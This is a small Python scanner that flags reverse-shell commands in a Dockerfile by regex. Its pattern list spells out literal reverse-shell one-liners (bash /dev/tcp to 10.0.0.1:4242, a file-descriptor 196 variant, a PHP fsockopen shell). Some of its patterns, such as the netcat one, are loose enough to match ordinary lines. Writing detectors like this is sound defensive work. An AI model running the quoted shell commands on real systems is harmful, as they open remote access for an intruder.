import re
import sys

def scan_dockerfile(dockerfile_path):
    shell_patterns = [
        (re.compile(r'(nc|netcat).*', re.IGNORECASE), 'Netcat shell'),
        (re.compile(r'python.*shell.*', re.IGNORECASE), 'Python shell'),
        (re.compile(r'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'), 'Bash shell'),
        (re.compile(r'0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196'), 'Shell'),
        (re.compile(r'/bin/bash -l'), 'Bash shell'),
        (re.compile(r'php -r \$sock=fsockopen'), 'PHP shell')
    ]

    with open(dockerfile_path, 'r') as dockerfile:
        file_contents = dockerfile.readlines()

    shell_found = False

    for line_number, line in enumerate(file_contents, start=1):
        for pattern, shell_name in shell_patterns:
            if pattern.search(line):
                print(f"Alert: {shell_name} detected in the Dockerfile (line {line_number}): {line.strip()}")
                shell_found = True

    if not shell_found:
        print("No shells detected in the Dockerfile.")


if len(sys.argv) < 2:
    print("Please provide the path to the Dockerfile as a command-line argument.")
    print("Example: python3 docker_scanner.py /path/to/Dockerfile")
    sys.exit(1)


dockerfile_path = sys.argv[1]


scan_dockerfile(dockerfile_path)